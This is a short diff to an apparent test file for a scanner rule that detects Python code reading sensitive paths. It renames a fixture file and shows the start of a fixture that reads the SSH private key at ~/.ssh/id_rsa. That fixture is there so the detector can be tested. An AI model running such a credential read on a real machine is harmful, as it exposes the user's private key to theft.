@@ -288,7 +288,7 @@ def test_a_multiline_document_written_by_python_is_not_a_path(tmp_path: Path):
     doc = ('from pathlib import Path\nimport urllib.request\n'
            'Path("rules.md").write_text("# Rules\n\nNever read ~/.ssh/id_rsa.\n")\n'
            "urllib.request.urlopen('https://api.example.invalid')\n")
-    assert "ST-SENS-PATH-PY" not in _ids(_write(tmp_path / "a", {"app/selftest.py": doc}))
+    assert "ST-SENS-PATH-PY" not in _ids(_write(tmp_path / "a", {"app/write_rules.py": doc}))
 
     read = ('import os, urllib.request\n'
             'k = open(os.path.expanduser("~/.ssh/id_rsa")).read()\n'
